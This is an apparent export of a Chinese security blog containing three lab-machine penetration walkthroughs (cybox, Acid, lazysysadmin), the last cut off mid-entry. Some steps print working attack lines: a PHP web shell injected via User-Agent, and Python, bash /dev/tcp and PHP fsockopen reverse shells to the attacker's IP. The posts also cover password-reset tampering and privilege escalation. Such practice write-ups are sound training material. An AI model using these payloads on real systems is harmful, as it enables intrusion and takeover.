<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>cybox1.1靶机练习</title>
    <link href="/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="cybox-1-1靶机练习"><a href="#cybox-1-1靶机练习" class="headerlink" title="cybox:1.1靶机练习"></a>cybox:1.1靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.141</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><h5 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3位网关地址，1.137为kali地址，因此判断目标靶机地址为192.168.1.141</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210102234570.png" alt="image-20210210102234570"></p><h5 id="端口服务扫描："><a href="#端口服务扫描：" class="headerlink" title="端口服务扫描："></a>端口服务扫描：</h5><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210113920614.png" alt="image-20210210113920614" style="zoom:67%;" /><p>靶机开启了80和443端口，访问一下看看</p><p>直接访问ip后是一个web页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114127375.png" alt="image-20210210114127375"></p><p>拖到页面最下方可以看到一个域名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114235781.png" alt="image-20210210114235781"></p><h5 id="爆破目录："><a href="#爆破目录：" class="headerlink" title="爆破目录："></a>爆破目录：</h5><p>爆破一下目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.141&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114345084.png" alt="image-20210210114345084" style="zoom: 80%;" /><p>同时也使用dirbuster爆破一下详细页面，以取得更多的信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115418915.png" alt="image-20210210115418915"></p><p>依次访问dirb爆出的目录，发现assets目录下存放了些css、js文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114945379.png" alt="image-20210210114945379" style="zoom: 67%;" /><p>/cgi/bin目录无访问权限，/phpadmin目录只允许本地访问</p><p>dirbuster爆破结果也出来了，与dirb扫出的结果相差不大，此时并没有发现到什么有价值的页面。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115351005.png" alt="image-20210210115351005"></p><p>此时我们甚至都没有找到真正提供服务的web页面，我们扫描端口时可以看到目标机器开放了ftp服务，还开放了pop3、imap，还提供邮件服务，很明显目标机器有一个较复杂的网站提供服务，但我们的扫描结果并不相符，说明爆破姿势不对</p><p>之前访问首页的时候看到了一个域名cybox.company，我们将其添加进hosts文件，尝试再次扫描一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115848593.png" alt="image-20210210115848593"></p><p>这次我们使用gobuster进行扫描，gobuster是一款基于go语言的目录/文件和DNS爆破工具，可以对目录、文件、DNS和VHost等对象进行暴力破解攻击，下载链接<a href="https://github.com/OJ/gobuster%EF%BC%8Ckali%E4%B8%8B%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5**apt-get">https://github.com/OJ/gobuster，kali下可以直接**apt-get</a> install gobuster**进行安装</p><p>扫描后，可以看到，有了我们之前并未爆破出的页面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -u http:<span class="hljs-regexp">//</span>cybox.company<span class="hljs-regexp">/ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210120618851.png" alt="image-20210210120618851"></p><p>依次访问各页面</p><p>dev.cybox.company是一个PHPinfo</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210122858686.png" alt="image-20210210122858686"></p><p>ftp.cybox.company是一个ftp页面，目测实现文件传输功能，需要验证用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123135118.png" alt="image-20210210123135118"></p><p>webmail.cybox.company是一个邮箱登录页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210124443912.png" alt="image-20210210124443912"></p><p>register.cybox.company是一个创建用户页面，尝试创建后直接显示创建成功，也并没有提示输入密码等信息，直接给了一个与用户名相同的密码，暂时不知道是创建了什么用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210125804934.png" alt="image-20210210125804934"></p><p>monitor.cybox.company访问后跳转到一个登录页面，下面两个链接可以跳转到一个注册页面，以及一个密码找回</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123613774.png" alt="image-20210210123613774"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>在上面这个页面，注册一个用户登录试一下</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210131944537.png" alt="image-20210210131944537" style="zoom:67%;" /><p>登录后发现并没有什么实际功能，只有一个创建条目记录时间的，不知道有什么作用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210132233531.png" alt="image-20210210132233531"></p><p>这里退出登录，试一下未注册用户，发现不存在的用户登录会直接提示用户不存在，这里可以试一下有无admin用户</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210134819545.png" alt="image-20210210134819545" style="zoom:67%;" /><p>尝试猜解管理员的用户名，因为登录页面提供密码修改，可以试试能不能越权修改密码，此处发现存在一个<a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#99;&#x79;&#x62;&#x6f;&#x78;&#x2e;&#x63;&#111;&#x6d;&#x70;&#x61;&#110;&#121;">&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#99;&#x79;&#x62;&#x6f;&#x78;&#x2e;&#x63;&#111;&#x6d;&#x70;&#x61;&#110;&#121;</a>，显示密码错误，并没有显示用户不存在，先记下，一会看看能不能改</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222525468.png" alt="image-20210210222525468" style="zoom:67%;" /><p>点击忘记密码，会跳转到一个发送链接的页面，这里是将修改链接发送到邮箱了，应该就是我们刚刚看到的那个邮箱的登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210135357234.png" alt="image-20210210135357234"></p><p>到邮箱登录页面webmail，登录，发现无法登录，一直显示密码用户名不匹配，说明两边的用户不互通，但我们这时还有一个之前的register.cybox.company/目录，用它创建一个同名用户aaa</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222010198.png" alt="image-20210210222010198" style="zoom:67%;" /><p>之后再到webmail登录，登录成功，可以看到我们之前接收到的修改密码的邮件，里面有个修改链接</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222214774.png" style="zoom: 50%;" /><p>点进去，跳转到一个修改密码页面，我们用burp抓下包，把邮箱改成admin的，看看能不能通过改包来越权修改admin用户的密码</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222942625.png" alt="image-20210210222942625" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223046506.png" alt="image-20210210223046506"></p><p>点击放包，直接跳转回了登录页面，尝试登录admin用户，登录成功，看来并没有什么验证</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223332763.png" alt="image-20210210223332763" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223359734.png" alt="image-20210210223359734"></p><p>点进Admin panel，看一下管理页面，结果，开发中</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223827281.png" alt="image-20210210223827281" style="zoom:67%;" /><p>到这里又断了，进入到网站的后台结果开发中。。。</p><p>但是方法总比困难多，右键查看页面代码，可以看到，这里包含进来一个php页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224124818.png" alt="image-20210210224124818"></p><p>我们可以尝试文件包含，包含一个/etc/passwd文件测试一下，包含成功，此处存在文件包含漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224656944.png" alt="image-20210210224656944"></p><p>然后咱们可以通过日志文件反弹一个shell，apache的日志目录为/opt/bitnami/apache2/logs/，请求日志文件为access_log，错误日志文件为error_log，我们包含请求日志看一下，可以看到，这是ftp页面的请求日志</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212173236662.png" alt="image-20210212173236662"></p><p>我们转到ftp页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200452500.png" alt="image-20210212200452500"></p><p>打开burp抓包，刷新页面，拦一个包下来，User-Agent改成cmd命令的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200557510.png" alt="image-20210212200557510"></p><p>发包，然后测试一下，测试成功，没有问题</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212201117351.png" alt="image-20210212201117351"></p><p>制作反弹shell</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&#x27;192.168.1.137&#x27;</span>,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>]);&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203519286.png" alt="image-20210212203519286"></p><p>kali端监听443端口（这里选取443是因为经测试此靶机只允许通往部分端口的数据包进出）</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203720362.png" alt="image-20210212203720362"></p><p>监听好端口后，web页面敲击回车，成功反弹shell，拿到了一个低权限的shell</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203808874.png" alt="image-20210212203808874" style="zoom:80%;" /><h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><p>首先查找有s权限的文件，只看非系统文件，此处需要审计代码，可以看到，在/opt目录下有一个registerlauncher</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212213925216.png" alt="image-20210212213925216" style="zoom:80%;" /><p>在我们查看此文件内容时可以发现它调用了另一个/opt目录下的文件register，注意此处直接用cat查看文件会乱码，需要用strings转化字符串</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s registerlauncher<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212214029876.png" alt="image-20210212214029876" style="zoom:80%;" /><p>在查看register文件内容，发现这是一个可以创建用户的文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212220738362.png" alt="image-20210212220738362" style="zoom: 80%;" /><p>实际就是实现了那个register页面的功能，测试之前创建的aaa用户，此处可以登录</p><p>首先取得一个交互shell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后尝试登录aaa，成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212222901048.png" alt="image-20210212222901048"></p><p>试一下能不能切换root，失败，提示我们aaa不再sudoers文件中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212223159058.png" alt="image-20210212223159058"></p><p>另外此处我们无权限查看sudoers文件，但应该是有用户持有切换权限的，这里就需要试了，所幸并不难猜，用户名起为sudo即可</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224130623.png" alt="image-20210212224130623" style="zoom:67%;" /><p>创建完之后切换用户sudo，即可切换root用户，至此提权完毕</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224253887.png" alt="image-20210212224253887"></p><p>在root的家目录下可以看到一个root.txt，查看一下，应该是个flag</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224445648.png" alt="image-20210212224445648"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/yutianovo/article/details/111687112">https://blog.csdn.net/yutianovo/article/details/111687112</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Acid靶机练习</title>
    <link href="/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="Acid靶机练习"><a href="#Acid靶机练习" class="headerlink" title="Acid靶机练习"></a>Acid靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.140</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3为网关地址，1.137为攻击机地址，因此推测目标主机地址为192.168.1.140</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210203223609124.png" alt="image-20210203223609124"></p><p>端口扫描：</p><p>可以看到目标机器使用了Apache作为中间件，开放了33447端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.140</span> -sV<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204093237048.png" alt="image-20210204093237048"></p><p>访问一下看看，发现是一个静态页面，扫描一下目录看看</p><p>首先用dirb扫一下，已经用了big的字典，但扫到的目录条目还是很少</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204100917676.png" alt="image-20210204100917676"></p><p>再用dirbuster爆破目录</p><p>选好字典，爆破目录选择根目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204101135047.png"></p><p>点击start开始爆破，得到了比较全面的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202104586.png" alt="image-20210204202104586"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>访问查看各条目，challenge目录下是一个登录页面，先放着不管</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202215238.png" alt="image-20210204202215238"></p><p>一路向下访问，到cake.php条目下的时候,可以看到标签页上出现了一个目录名Magic_Box，结合页面上的话，另外页面叫cake.php，这个目录应该是有用的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204204000254.png" alt="image-20210204204000254"></p><p>再次爆破这个Magic_Box目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204222202012.png" alt="image-20210204222202012"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224446448.png" alt="image-20210204224446448"></p><p>得到的结果中有一个command.php，访问后发现是一个可以执行ping命令的页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224626144.png" alt="image-20210204224626144"></p><p>测试命令注入，提交参数后并没有回显信息，burp抓包看一下，果然，信息是有的，只是没有直接回显到页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225054147.png" alt="image-20210204225054147"></p><p>用ifconfig测试一下，发现果然存在命令注入</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225212133.png" alt="image-20210204225212133"></p><p>尝试反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.1.137</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175956076.png" alt="image-20210205175956076"></p><p>kali端监听4444端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205173317428.png" alt="image-20210205173317428"></p><p>未果，反弹失败，尝试转url编码，依旧反弹失败</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175147349.png" alt="image-20210205175147349"></p><p>尝试其他的反弹方式</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">;php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.1.137&quot;</span>,<span class="hljs-number">4444</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><p>反弹成功</p><h4 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h4><p>首先查看passwd文件，看一下用户</p><p>着重关注acid、saman两个用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200204389.png" alt="image-20210205200204389"></p><p>查看一下这两个用户的文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user saman 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200354607.png" alt="image-20210205200354607"></p><p>find / -user acid 2&gt;/dev/null</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200506712.png" alt="image-20210205200506712"></p><p>在acid的文件中可以看到一个抓包文件hunt.pcapng，显得格格不入，我们通过ssh把它复制下来，这里因为kali linux为保证安全性，ssh是默认禁止连接的，需要修改配置文件，这里我直接使用了另外一台centos来接收文件，ip为192.168.1.131</p><p>首先取得一个交互shell，以进行下一步操作，在原本shell中输入以下命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后使用命令scp来复制传输文件，如图传输成功</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp /sbin/raw_vs_isi/hint.pcapng root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.1</span>.<span class="hljs-number">131</span><span class="hljs-symbol">:/root/hint</span>.pcapng<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201641880.png" alt="image-20210205201641880"></p><p>拿到抓包文件后，用wireshark打开</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201844205.png" alt="image-20210205201844205"></p><p>逐包查看，未果，可以分数据包种类跟踪流，查看数据包信息</p><p>追踪tcp流时，可以看到saman用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202141370.png" alt="image-20210205202141370"></p><p>我们切换到此用户saman，成功切换，之后再尝试用户saman切换root，发现有权限，切换成功，提权至root</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202547170.png" alt="image-20210205202547170"></p><p>参考文章：<a href="https://www.freebuf.com/column/200518.html">https://www.freebuf.com/column/200518.html</a></p><p>​                    </p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lazysysadmin靶机练习</title>
    <link href="/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="lazysysadmin靶机练习"><a href="#lazysysadmin靶机练习" class="headerlink" title="lazysysadmin靶机练习"></a>lazysysadmin靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.138</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/%E6%B5%8B%E8%AF%95.png" alt="image-20210127195115436"></p><p>端口扫描：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV <span class="hljs-number">192.168.1.138</span><br></code></pre></td></tr></table></figure><p>可以看到目标主机开放了samba服务，先放着一会再看</p><p><img src="E:\大三上作业练习\web安全\web练习\lazysysadmin靶机练习\lazysysadmin靶机练习.assets\image-20210128221658996.png" alt="image-20210128221658996"></p><p>目录爆破：</p><p>这里用了kali里已有的dirb进行目录遍历</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.138&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><p>可以看到有一个wordpress目录，猜想网站是wordpress架构的，另外有一个phpmyadmin目录，大概可以登录管理数据库</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130102741766.png" alt="image-20210130102741766"></p><p>直接访问80端口，跳转到一个近似静态的页面，几乎没有什么互动性，也不会跳转到其他页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222825295.png" alt="image-20210130222825295"></p><p>查看一下robots.txt</p><p>显示出来的目录和我们用dirb爆破出的基本一致</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224040160.png" alt="image-20210130224040160"></p><p>依次访问我们之前爆破出的目录，看看有什么有用的信息</p><p>访问<a href="http://192.168.1.138/wordpress/wp-admin/%E6%97%B6%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E8%B4%A6%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%8C%E5%85%88%E6%94%BE%E7%9D%80">http://192.168.1.138/wordpress/wp-admin/时会跳转到一个后台管理登录页面，不知道账户名密码，先放着</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222411433.png" alt="image-20210130222411433"></p><p>访问<a href="http://192.168.1.138/phpmyadmin/%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0phpmyadmin%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%94%BE%E5%9C%A8%E4%B8%80%E8%BE%B9">http://192.168.1.138/phpmyadmin/会跳转到phpmyadmin，依旧放在一边</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222610561.png" alt="image-20210130222610561"></p><p>直接访问wordpress目录会到一个可留言的web页面，内容全部是my name is togie看起来像是个博客之类的，翻到底下还可以看见评论</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224307649.png" alt="image-20210130224307649"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>网站上并没有发现什么特别有用的信息，除了看到一个togie，疑似用户名，可以尝试ssh爆破，其他地方没有很明显的漏洞点，我们之前扫描端口的时候发现了靶机开放，连上去看一看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smb:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.138</span>/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224846851.png" alt="image-20210130224846851"></p><p>点进共享文件夹后，可以看到里面的这些目录，和我们爆破到的网站目录基本一致，既然如此，可以看看有没有我们想要找的配置文件，比如说wp-congfig.php之类的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225107101.png" alt="image-20210130225107101"></p><p>果然有，打开以后找到我们想要的数据库用户名密码</p><p>Admin、TogieMYSQL12345^^</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225244557.png" alt="image-20210130225244557"></p><p>还可以在一个deets.txt文件里看到一串密码12345，暂时不知道有什么用</p><p><img 